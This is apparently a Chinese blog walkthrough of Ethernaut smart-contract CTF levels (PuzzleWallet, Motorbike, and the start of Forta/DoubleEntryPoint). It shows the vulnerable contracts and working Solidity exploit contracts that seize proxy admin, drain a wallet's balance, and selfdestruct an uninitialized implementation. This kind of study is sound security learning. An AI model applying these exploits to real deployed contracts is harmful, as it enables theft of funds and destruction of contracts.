+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br>pragma experimental ABIEncoderV2;<br><br>import &quot;../helpers/UpgradeableProxy-08.sol&quot;;<br><br>contract PuzzleProxy is UpgradeableProxy &#123;<br>    address public pendingAdmin;<br>    address public admin;<br><br>    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;<br>        admin = _admin;<br>    &#125;<br><br>    modifier onlyAdmin &#123;<br>      require(msg.sender == admin, &quot;Caller is not the admin&quot;);<br>      _;<br>    &#125;<br><br>    function proposeNewAdmin(address _newAdmin) external &#123;<br>        pendingAdmin = _newAdmin;<br>    &#125;<br><br>    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;<br>        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);<br>        admin = pendingAdmin;<br>    &#125;<br><br>    function upgradeTo(address _newImplementation) external onlyAdmin &#123;<br>        _upgradeTo(_newImplementation);<br>    &#125;<br>&#125;<br><br>contract PuzzleWallet &#123;<br>    address public owner;<br>    uint256 public maxBalance;<br>    mapping(address =&gt; bool) public whitelisted;<br>    mapping(address =&gt; uint256) public balances;<br><br>    function init(uint256 _maxBalance) public &#123;<br>        require(maxBalance == 0, &quot;Already initialized&quot;);<br>        maxBalance = _maxBalance;<br>        owner = msg.sender;<br>    &#125;<br><br>    modifier onlyWhitelisted &#123;<br>        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);<br>        _;<br>    &#125;<br><br>    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;<br>      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);<br>      maxBalance = _maxBalance;<br>    &#125;<br><br>    function addToWhitelist(address addr) external &#123;<br>        require(msg.sender == owner, &quot;Not the owner&quot;);<br>        whitelisted[addr] = true;<br>    &#125;<br><br>    function deposit() external payable onlyWhitelisted &#123;<br>      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);<br>      balances[msg.sender] += msg.value;<br>    &#125;<br><br>    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;<br>        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);<br>        balances[msg.sender] -= value;<br>        (bool success, ) = to.call&#123; value: value &#125;(data);<br>        require(success, &quot;Execution failed&quot;);<br>    &#125;<br><br>    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;<br>        bool depositCalled = false;<br>        for (uint256 i = 0; i &lt; data.length; i++) &#123;<br>            bytes memory _data = data[i];<br>            bytes4 selector;<br>            assembly &#123;<br>                selector := mload(add(_data, 32))<br>            &#125;<br>            if (selector == this.deposit.selector) &#123;<br>                require(!depositCalled, &quot;Deposit can only be called once&quot;);<br>                // Protect against reusing msg.value<br>                depositCalled = true;<br>            &#125;<br>            (bool success, ) = address(this).delegatecall(data[i]);<br>            require(success, &quot;Error while delegating call&quot;);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>PuzzleProxy是代理合约，PuzzleWallet是逻辑合约</p>
+<p>这实际上是一个可升级合约</p>
+<p><code>Proxy</code>合约利用fallback，将所有调用通过delegateCall委托给<code>Logic</code>合约</p>
+<p>PuzzleProxy的slot布局：</p>
+<table>
+<thead>
+<tr>
+<th>slot</th>
+<th>data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>slot0</td>
+<td>unused(12 bytes) | pendingAdmin(20 bytes)</td>
+</tr>
+<tr>
+<td>slot1</td>
+<td>unused(12 bytes) | admin(20 bytes)</td>
+</tr>
+</tbody></table>
+<p>PuzzleWallet的slot布局：</p>
+<table>
+<thead>
+<tr>
+<th>slot</th>
+<th>data</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>slot0</td>
+<td>unused(12 bytes) | owner(20 bytes)</td>
+</tr>
+<tr>
+<td>slot1</td>
+<td>maxBalance(32 bytes)</td>
+</tr>
+<tr>
+<td>slot2</td>
+<td>whitelisted(32 bytes)</td>
+</tr>
+<tr>
+<td>slot3</td>
+<td>balances(32 bytes)</td>
+</tr>
+</tbody></table>
+<p>我们想要成为admin，就要修改slot1的值，可以通过<code>setMaxBalance</code></p>
+<p>但是<code>setMaxBalance</code> 又需要我们在whitelist里面，我们需要调<code>addToWhitelist</code> 将自己添加到白名单里</p>
+<p>但是<code>addToWhitelist</code> 需要我们是PuzzleWallet的owner，owner是存储在slot0里面的，通过调<code>proposeNewAdmin</code> 可以修改slot0的值</p>
+<ol>
+<li>调用<code>proposeNewAdmin</code> 修改slot0的值</li>
+</ol>
+<p><img src="/assets/image-20231225170807909.png" srcset="/img/loading.gif" lazyload alt="image-20231225170807909"></p>
+<ol start="2">
+<li>调用addToWhitelist，将自己加入白名单</li>
+</ol>
+<p><img src="/assets/image-20231225171055484.png" srcset="/img/loading.gif" lazyload alt="image-20231225171055484"></p>
+<ol start="3">
+<li>调用setMaxBalance，修改slot0</li>
+</ol>
+<p>还有一个前提是需要当前合约的balance为0，但是当前balance不为0</p>
+<p> <code>deposit</code>是一个存款函数，<code>execute</code> 是一个取款函数</p>
+<p>通过multicall，可以多次调用deposit进行取款，但是有个if判断只让调一次deposit，可以通过<code>multicall(deposit())</code>，此时的函数签名为multicall，可以绕过if判断</p>
+<p>最终Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    PuzzleProxy public puzzle = PuzzleProxy(0xbE9878B9D785D4De3Db67e7720Ab5a49B9F23C70);<br>    function exploit() public payable &#123;<br>        puzzle.proposeNewAdmin(address(this));<br>        puzzle.addToWhitelist(address(this));<br>        bytes[] memory data = new bytes[](2);<br>        data[0] = abi.encodeWithSignature(&quot;deposit()&quot;);<br>        bytes[] memory deposite_data = new bytes[](1);<br>        deposite_data[0] = data[0];<br>        data[1] = abi.encodeWithSignature(&quot;multicall(bytes[])&quot;, deposite_data);<br>        puzzle.multicall&#123;value: msg.value&#125;(data);<br>        puzzle.execute(msg.sender, 0.002 ether,&quot;&quot;);<br>        puzzle.setMaxBalance(uint256(uint160(msg.sender)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="MotorBike"><a href="#MotorBike" class="headerlink" title="MotorBike"></a>MotorBike</h2><blockquote>
+<p>Ethernaut’s motorbike has a brand new upgradeable engine design.</p>
+<p>Would you be able to <code>selfdestruct</code> its engine and make the motorbike unusable ?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &lt;0.7.0;<br><br>import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;<br>import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;<br><br>contract Motorbike &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br>    <br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br>    <br>    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.<br>    constructor(address _logic) public &#123;<br>        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);<br>        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;<br>        (bool success,) = _logic.delegatecall(<br>            abi.encodeWithSignature(&quot;initialize()&quot;)<br>        );<br>        require(success, &quot;Call failed&quot;);<br>    &#125;<br><br>    // Delegates the current call to `implementation`.<br>    function _delegate(address implementation) internal virtual &#123;<br>        // solhint-disable-next-line no-inline-assembly<br>        assembly &#123;<br>            calldatacopy(0, 0, calldatasize())<br>            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)<br>            returndatacopy(0, 0, returndatasize())<br>            switch result<br>            case 0 &#123; revert(0, returndatasize()) &#125;<br>            default &#123; return(0, returndatasize()) &#125;<br>        &#125;<br>    &#125;<br><br>    // Fallback function that delegates calls to the address returned by `_implementation()`. <br>    // Will run if no other function in the contract matches the call data<br>    fallback () external payable virtual &#123;<br>        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);<br>    &#125;<br><br>    // Returns an `AddressSlot` with member `value` located at `slot`.<br>    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;<br>        assembly &#123;<br>            r_slot := slot<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract Engine is Initializable &#123;<br>    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1<br>    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;<br><br>    address public upgrader;<br>    uint256 public horsePower;<br><br>    struct AddressSlot &#123;<br>        address value;<br>    &#125;<br><br>    function initialize() external initializer &#123;<br>        horsePower = 1000;<br>        upgrader = msg.sender;<br>    &#125;<br><br>    // Upgrade the implementation of the proxy to `newImplementation`<br>    // subsequently execute the function call<br>    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;<br>        _authorizeUpgrade();<br>        _upgradeToAndCall(newImplementation, data);<br>    &#125;<br><br>    // Restrict to upgrader role<br>    function _authorizeUpgrade() internal view &#123;<br>        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);<br>    &#125;<br><br>    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.<br>    function _upgradeToAndCall(<br>        address newImplementation,<br>        bytes memory data<br>    ) internal &#123;<br>        // Initial upgrade and setup call<br>        _setImplementation(newImplementation);<br>        if (data.length &gt; 0) &#123;<br>            (bool success,) = newImplementation.delegatecall(data);<br>            require(success, &quot;Call failed&quot;);<br>        &#125;<br>    &#125;<br>    <br>    // Stores a new address in the EIP1967 implementation slot.<br>    function _setImplementation(address newImplementation) private &#123;<br>        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);<br>        <br>        AddressSlot storage r;<br>        assembly &#123;<br>            r_slot := _IMPLEMENTATION_SLOT<br>        &#125;<br>        r.value = newImplementation;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Initializable合约的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>pragma solidity &gt;=0.4.24 &lt;0.7.0;<br><br><br>/**<br> * @title Initializable<br> *<br> * @dev Deprecated. This contract is kept in the Upgrades Plugins for backwards compatibility purposes.<br> * Users should use openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol instead.<br> *<br> * Helper contract to support initializer functions. To use it, replace<br> * the constructor with a function that has the `initializer` modifier.<br> * WARNING: Unlike constructors, initializer functions must be manually<br> * invoked. This applies both to deploying an Initializable contract, as well<br> * as extending an Initializable contract via inheritance.<br> * WARNING: When used with inheritance, manual care must be taken to not invoke<br> * a parent initializer twice, or ensure that all initializers are idempotent,<br> * because this is not dealt with automatically as with constructors.<br> */<br>contract Initializable &#123;<br><br>  /**<br>   * @dev Indicates that the contract has been initialized.<br>   */<br>  bool private initialized;<br><br>  /**<br>   * @dev Indicates that the contract is in the process of being initialized.<br>   */<br>  bool private initializing;<br><br>  /**<br>   * @dev Modifier to use in the initializer function of a contract.<br>   */<br>  modifier initializer() &#123;<br>    require(initializing || isConstructor() || !initialized, &quot;Contract instance has already been initialized&quot;);<br><br>    bool isTopLevelCall = !initializing;<br>    if (isTopLevelCall) &#123;<br>      initializing = true;<br>      initialized = true;<br>    &#125;<br><br>    _;<br><br>    if (isTopLevelCall) &#123;<br>      initializing = false;<br>    &#125;<br>  &#125;<br><br>  /// @dev Returns true if and only if the function is running in the constructor<br>  function isConstructor() private view returns (bool) &#123;<br>    // extcodesize checks the size of the code stored in an address, and<br>    // address returns the current address. Since the code is still not<br>    // deployed when running a constructor, any checks on its code size will<br>    // yield zero, making it an effective way to detect if a contract is<br>    // under construction or not.<br>    address self = address(this);<br>    uint256 cs;<br>    assembly &#123; cs := extcodesize(self) &#125;<br>    return cs == 0;<br>  &#125;<br><br>  // Reserved storage space to allow for layout changes in the future.<br>  uint256[50] private ______gap;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Motorbike是代理合约，Engine是逻辑合约</p>
+<p>Motorbike通过<code>delegateCall</code> 调了Engine合约的initialize方法</p>
+<p>通过阅读Initializable的源码发现，在initialize方法中使用initialized 和 initializing 变量来限制只能调用一次<code>initialize</code> 方法</p>
+<p>但是因为是通过delegateCall调用的，变量的上下文用的是Motorbike的，Engine合约的上下文并没有被改变</p>
+<p>通过找到Engine合约的地址直接调用Engine合约的initialize方法，此时的上下文用的是Engine合约的，可以把upgrader设置为自身</p>
+<p>可以看到逻辑合约的地址是存在<code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>中的，这实际上是 eip-1967的实现，避免存放逻辑合约地址的slot影响到存放正常变量的slot</p>
+<p>通过</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">await web3<span class="hljs-selector-class">.eth</span><span class="hljs-selector-class">.getStorageAt</span>(contract<span class="hljs-selector-class">.address</span>,<span class="hljs-string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>获取到Engine合约的地址为0x5a8f77d76Ba94f2D54B44Bcc51F178d376caD509</p>
+<p>成为upgrader后通过upgradeToAndCall的地址，并使用delegateCall调代理合约的selfdestruct，此时上下文是Engine的，就把Engine合约销毁了</p>
+<p>Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Hack &#123;<br>    function kill() external  &#123;<br>        selfdestruct(payable(0xAE180bcc68A4A32203210DFe4fD40a11Ad5e5d27));<br>    &#125;<br>&#125;<br><br>contract Exploit &#123;<br>    Engine public engine = Engine(0x5a8f77d76Ba94f2D54B44Bcc51F178d376caD509);<br>    function exploit() public&#123;<br>        engine.initialize();<br>        engine.upgradeToAndCall(address(new Hack()),abi.encodeWithSignature(&quot;kill&quot;));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Forta"><a href="#Forta" class="headerlink" title="Forta"></a>Forta</h2><blockquote>
+<p>This level features a <code>CryptoVault</code> with special functionality, the <code>sweepToken</code> function. This is a common function used to retrieve tokens stuck in a contract. The <code>CryptoVault</code> operates with an <code>underlying</code> token that can’t be swept, as it is an important core logic component of the <code>CryptoVault</code>. Any other tokens can be swept.</p>
+<p>The underlying token is an instance of the DET token implemented in the <code>DoubleEntryPoint</code> contract definition and the <code>CryptoVault</code> holds 100 units of it. Additionally the <code>CryptoVault</code> also holds 100 of <code>LegacyToken LGT</code>.</p>
+<p>In this level you should figure out where the bug is in <code>CryptoVault</code> and protect it from being drained out of tokens.</p>
+<p>The contract features a <code>Forta</code> contract where any user can register its own <code>detection bot</code> contract. Forta is a decentralized, community-based monitoring network  to detect threats and anomalies on DeFi, NFT, governance, bridges and  other Web3 systems as quickly as possible. Your job is to implement a <code>detection bot</code> and register it in the <code>Forta</code> contract. The bot’s implementation will need to raise correct alerts to prevent potential attacks or bug exploits.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;<br>import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;<br><br>interface DelegateERC20 &#123;<br>  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);<br>&#125;<br><br>interface IDetectionBot &#123;<br>    function handleTransaction(address user, bytes calldata msgData) external;<br>&#125;<br><br>interface IForta &#123;<br>    function setDetectionBot(address detectionBotAddress) external;<br>    function notify(address user, bytes calldata msgData) external;<br>    function raiseAlert(address user) external;<br>&#125;<br><br>contract Forta is IForta &#123;<br>  mapping(address =&gt; IDetectionBot) public usersDetectionBots;<br>  mapping(address =&gt; uint256) public botRaisedAlerts;<br><br>  function setDetectionBot(address detectionBotAddress) external override &#123;<br>      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);<br>  &#125;<br><br>  function notify(address user, bytes calldata msgData) external override &#123;<br>    if(address(usersDetectionBots[user]) == address(0)) return;<br>    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;<br>        return;<br>    &#125; catch &#123;&#125;<br>  &#125;<br><br>  function raiseAlert(address user) external override &#123;<br>      if(address(usersDetectionBots[user]) != msg.sender) return;<br>      botRaisedAlerts[msg.sender] += 1;<br>  &#125; <br>&#125;<br><br>contract CryptoVault &#123;<br>    address public sweptTokensRecipient;<br>    IERC20 public underlying;<br><br>    constructor(address recipient) &#123;<br>        sweptTokensRecipient = recipient;<br>    &#125;<br><br>    function setUnderlying(address latestToken) public &#123;<br>        require(address(underlying) == address(0), &quot;Already set&quot;);<br>        underlying = IERC20(latestToken);<br>    &#125;<br><br>    /*<br>    ...<br>    */<br><br>    function sweepToken(IERC20 token) public &#123;<br>        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);<br>        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));<br>    &#125;<br>&#125;<br><br>contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;<br>    DelegateERC20 public delegate;<br><br>    function mint(address to, uint256 amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;<br>        delegate = newContract;<br>    &#125;<br><br>    function transfer(address to, uint256 value) public override returns (bool) &#123;<br>        if (address(delegate) == address(0)) &#123;<br>            return super.transfer(to, value);<br>        &#125; else &#123;<br>            return delegate.delegateTransfer(to, value, msg.sender);<br>        &#125;<br>    &#125;<br>&#125;<br><br>contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;<br>    address public cryptoVault;<br>    address public player;<br>    address public delegatedFrom;<br>    Forta public forta;<br><br>    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;<br>        delegatedFrom = legacyToken;<br>        forta = Forta(fortaAddress);<br>        player = playerAddress;<br>        cryptoVault = vaultAddress;<br>        _mint(cryptoVault, 100 ether);<br>    &#125;<br><br>    modifier onlyDelegateFrom() &#123;<br>        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);<br>        _;<br>    &#125;<br><br>    modifier fortaNotify() &#123;<br>        address detectionBot = address(forta.usersDetectionBots(player));<br><br>        // Cache old number of bot alerts<br>        uint256 previousValue = forta.botRaisedAlerts(detectionBot);<br><br>        // Notify Forta<br>        forta.notify(player, msg.data);<br><br>        // Continue execution<br>        _;<br><br>        // Check if alarms have been raised<br>        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);<br>    &#125;<br><br>    function delegateTransfer(<br>        address to,<br>        uint256 value,<br>        address origSender<br>    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;<br>        _transfer(origSender, to, value);<br>        return true;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>有两个ERC20代币代币，LegacyToken(LGT)和DoubleEntryPoint(DET)</p>
+<p>以及一个CryptoVault，分别持有100个LGT和100个DET</p>
+<p>题目中给的instance是DoubleEntryPoint的，从中可以获取其他合约的地址</p>
+<p>CryptoVault实现了<code>sweepToken</code> ，可以将自己的token转到sweptTokensRecipient地址</p>
+<p>但是交易的token不能是underlying，underlying在这里是DET</p>
+<p><img src="/assets/image-20231227110404735.png" srcset="/img/loading.gif" lazyload alt="image-20231227110404735"></p>
+<p>如果我们尝试输入LGT的地址，此时会执行LGT的transfer逻辑</p>
